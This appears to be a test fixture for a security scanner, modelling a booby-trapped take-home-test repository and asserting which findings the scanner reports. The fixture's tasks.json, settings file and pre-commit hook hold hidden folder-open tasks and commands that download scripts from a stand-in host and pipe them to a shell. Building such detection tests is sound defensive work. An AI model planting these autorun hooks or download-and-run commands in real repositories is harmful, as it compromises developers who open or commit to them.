@@ -1,0 +1,41 @@
+# A repository in the shape of a PolinRider take-home test: a folder-open
+# task with commands for each OS that hides its terminal and runs node on
+# a fake font, a settings file that turns on automatic tasks, and a
+# .githooks hook. The attacks gate fails on the task. The settings finding
+# is high and is not an attack.
+cd repo
+execexit 1 vet scan . --mode plain -o json --fail-on attacks
+stdout '"control_id":"suspicious-command","family":"agent-config","severity":"critical"'
+stdout '"title":"eslint-check \(osx\) runs a file that is not a script with node'
+stdout '"title":"eslint-check \(linux\) downloads a script and pipes it to a shell'
+stdout '"title":"eslint-check \(windows\) downloads a script and pipes it to a shell'
+stdout '"control_id":"editor-autorun-enabled","family":"agent-config","severity":"high"'
+stdout '"path":".githooks/pre-commit"'
+
+-- repo/.vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "osx": {"command": "node public/fonts/fa-solid-400.woff2"},
+      "linux": {"command": "wget -qO- 'https://x.example/settings/linux?flag=5' | sh"},
+      "windows": {"command": "curl https://x.example/settings/win?flag=5 | cmd"},
+      "hide": true,
+      "presentation": {"reveal": "never", "echo": false, "focus": false, "close": true},
+      "runOptions": {"runOn": "folderOpen"},
+    },
+  ],
+}
+-- repo/.vscode/settings.json --
+{
+  // Let the setup task run.
+  "task.allowAutomaticTasks": "on",
+}
+-- repo/.githooks/pre-commit --
+#!/bin/sh
+curl -s https://x.example/settings/$(uname -s)?flag=5 | sh > /dev/null 2>&1
+exit 0
+-- repo/public/fonts/fa-solid-400.woff2 --
+console.log(1)
